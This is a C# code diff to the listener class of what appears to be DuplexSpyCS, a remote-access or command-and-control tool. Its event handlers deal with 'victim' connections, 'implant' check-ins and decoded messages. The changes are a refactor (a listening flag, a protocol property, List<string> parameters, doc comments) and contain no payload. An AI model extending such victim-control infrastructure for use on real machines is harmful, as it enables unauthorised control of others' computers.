@@ -10,9 +10,13 @@ namespace DuplexSpyCS
     {
         #region Information
 
+        public bool m_bIslistening = false;
+
         public string m_szName { set; get; }
         public int m_nPort { get; set; }
         public string m_szDescription { get; set; }
+
+        public enListenerProtocol m_protocol { get; set; }
 
         #endregion
         #region Event
@@ -20,8 +24,8 @@ namespace DuplexSpyCS
         /// <summary>
         /// Received bytes event handler.
         /// </summary>
-        /// <param name="l">Listener class.</param>
-        /// <param name="v">Victim class.</param>
+        /// <param name="l">Listener object.</param>
+        /// <param name="v">Victim object.</param>
         /// <param name="buffer">Received bytes buffer.</param>
         /// <param name="rec">Bytes size.</param>
         public delegate void ReceivedEventHandler(clsListener l, clsVictim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec);
@@ -30,25 +34,36 @@ namespace DuplexSpyCS
         /// <summary>
         /// Decoded bytes event handler.
         /// </summary>
-        /// <param name="l">Listener class.</param>
-        /// <param name="v">Victim class.</param>
+        /// <param name="l">Listener object.</param>
+        /// <param name="v">Victim object.</param>
         /// <param name="aMsg">Decoded bytes data.</param>
-        public delegate void ReceivedDecodedEventHandler(clsListener l, clsVictim v, string[] aMsg);
+        public delegate void ReceivedDecodedEventHandler(clsListener l, clsVictim v, List<string> Msg);
         public event ReceivedDecodedEventHandler ReceivedDecoded; //Decoded bytes event.
 
         /// <summary>
         /// Victim disconnect event handler.
         /// </summary>
-        /// <param name="v"></param>
+        /// <param name="v">clsVictim object.</param>
         public delegate void DisconenctedEventHandler(clsVictim v);
         public event DisconenctedEventHandler Disconencted; //Disconnected event.
 
-        public delegate void ImplantConnectedHandler(clsListener l, clsVictim v, string[] aszMsg);
+        /// <summary>
+        /// Implant disconencted event handler.
+        /// </summary>
+        /// <param name="l">Listener object.</param>
+        /// <param name="v">clsVictim object.</param>
+        /// <param name="lsMsg">Message List.</param>
+        public delegate void ImplantConnectedHandler(clsListener l, clsVictim v, List<string> lsMsg);
         public event ImplantConnectedHandler ImplantConnected;
 
         #endregion
 
         public clsListener()
+        {
+
+        }
+
+        ~clsListener()
         {
 
         }
@@ -68,9 +83,9 @@ namespace DuplexSpyCS
             Received?.Invoke(listener, victim, buffer, nRecv);
         }
 
-        public void fnReceivedDecoded(clsListener listener, clsVictim victim, string[] aMsg)
+        public void fnReceivedDecoded(clsListener listener, clsVictim victim, List<string> lsMsg)
         {
-            ReceivedDecoded?.Invoke(listener, victim, aMsg);
+            ReceivedDecoded?.Invoke(listener, victim, lsMsg);
         }
 
         public void fnDisconnected(clsVictim victim)
@@ -78,9 +93,9 @@ namespace DuplexSpyCS
             Disconencted?.Invoke(victim);
         }
 
-        public void fnImplantConnected(clsListener listener, clsVictim victim, string[] aMsg)
+        public void fnImplantConnected(clsListener listener, clsVictim victim, List<string> lsMsg)
         {
-            ImplantConnected?.Invoke(listener, victim, aMsg);
+            ImplantConnected?.Invoke(listener, victim, lsMsg);
         }
     }
 }
